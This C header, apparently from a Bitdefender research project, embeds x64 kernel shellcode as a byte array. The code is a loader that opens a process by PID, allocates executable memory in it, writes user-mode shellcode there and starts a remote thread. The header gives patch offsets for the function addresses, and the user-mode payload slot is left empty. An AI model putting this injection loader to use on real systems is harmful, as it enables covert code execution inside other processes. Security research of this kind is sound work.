/*
 * Copyright (c) 2025 Bitdefender
 * SPDX-License-Identifier: BSD-3-Clause
 */
#ifndef SHELLCODE_H_
#define SHELLCODE_H_

#include <Windows.h>

// Offsets inside the kernel shellcode where we place the virtual addresses of these functions.
#define OFS_ZWOPENPROCESS                   16
#define OFS_ZWALLOCATEVIRTUALMEMORY         24
#define OFS_ZWWRITEVIRTUALMEMORY            32
#define OFS_ZWCREATETHREADEX                40
#define OFS_PID                             48
#define OFS_PROGRAM                         715

BYTE gKernelShellcode[] =
{
    // First part is the kernel shellcode/loader, which is responsabile for injecting the user-mode
    // shellcode inside the target process. Check out loader\loader.asm for the source code.
    0xeb, 0x36, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
    0xb0, 0x8b, 0x82, 0x79, 0x02, 0xf8, 0xff, 0xff, 0xf0, 0x89, 0x82, 0x79, 0x02, 0xf8, 0xff, 0xff, 
    0x30, 0x8e, 0x82, 0x79, 0x02, 0xf8, 0xff, 0xff, 0xd0, 0x9f, 0x82, 0x79, 0x02, 0xf8, 0xff, 0xff, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x55, 0xc0, 0xfb, 0x50, 0x51, 0x52, 
    0x53, 0x55, 0x56, 0x57, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 
    0x41, 0x56, 0x41, 0x57, 0x90, 0x48, 0x81, 0xec, 0x00, 0x01, 0x00, 0x00, 0x48, 0x89, 0xe5, 0xf0, 
    0x65, 0x0f, 0xba, 0x2c, 0x25, 0x54, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x82, 0x31, 0x01, 0x00, 0x00, 
    0x48, 0xc7, 0x45, 0x20, 0x30, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0x28, 0x00, 0x00, 0x00, 0x00, 
    0x48, 0xc7, 0x45, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0x38, 0x00, 0x02, 0x00, 0x00, 
    0x48, 0xc7, 0x45, 0x40, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0x48, 0x00, 0x00, 0x00, 0x00, 
    0x48, 0x8b, 0x05, 0x89, 0xff, 0xff, 0xff, 0x48, 0x89, 0x45, 0x50, 0x48, 0xc7, 0x45, 0x58, 0x00, 
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x60, 0xba, 0xff, 0xff, 0x1f, 0x00, 0x4c, 0x8d, 0x45, 0x20, 
    0x4c, 0x8d, 0x4d, 0x50, 0x48, 0x83, 0xec, 0x20, 0xff, 0x15, 0x42, 0xff, 0xff, 0xff, 0x48, 0x83, 
    0xc4, 0x20, 0x85, 0xc0, 0x0f, 0x88, 0xc7, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0x60, 0x48, 0x8d, 
    0x55, 0x78, 0x48, 0xc7, 0x02, 0x00, 0x00, 0x00, 0x00, 0x4d, 0x31, 0xc0, 0x4c, 0x8d, 0x4d, 0x70, 
    0x49, 0xc7, 0x01, 0x14, 0x01, 0x00, 0x00, 0x6a, 0x40, 0x68, 0x00, 0x30, 0x00, 0x00, 0x48, 0x83, 
    0xec, 0x20, 0xff, 0x15, 0x10, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x30, 0x85, 0xc0, 0x0f, 0x88, 
    0x8d, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0x60, 0x48, 0x8b, 0x55, 0x78, 0x4c, 0x8d, 0x05, 0x9d, 
    0x00, 0x00, 0x00, 0x4c, 0x8b, 0x4d, 0x70, 0x6a, 0x00, 0x6a, 0x00, 0x48, 0x83, 0xec, 0x20, 0xff, 
    0x15, 0xeb, 0xfe, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x30, 0x85, 0xc0, 0x78, 0x64, 0x48, 0xc7, 0x45, 
    0x20, 0x30, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 
    0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0x38, 0x00, 0x02, 0x00, 0x00, 0x48, 0xc7, 0x45, 
    0x40, 0x00, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0x48, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 
    0x68, 0xba, 0xff, 0xff, 0x1f, 0x00, 0x4c, 0x8d, 0x45, 0x20, 0x4c, 0x8b, 0x4d, 0x60, 0x6a, 0x00, 
    0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0x6a, 0x00, 0xff, 0x75, 0x78, 0x48, 
    0x83, 0xec, 0x20, 0xff, 0x15, 0x8f, 0xfe, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x60, 0x85, 0xc0, 0x78, 
    0x00, 0x48, 0x81, 0xc4, 0x00, 0x01, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 
    0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59, 0x41, 0x58, 0x5f, 0x5e, 0x5d, 0x5b, 0x5a, 0x59, 0x58, 0xc3, 

    // Second part is the user-mode shellcode. Add it here.

};

#endif // SHELLCODE_H_
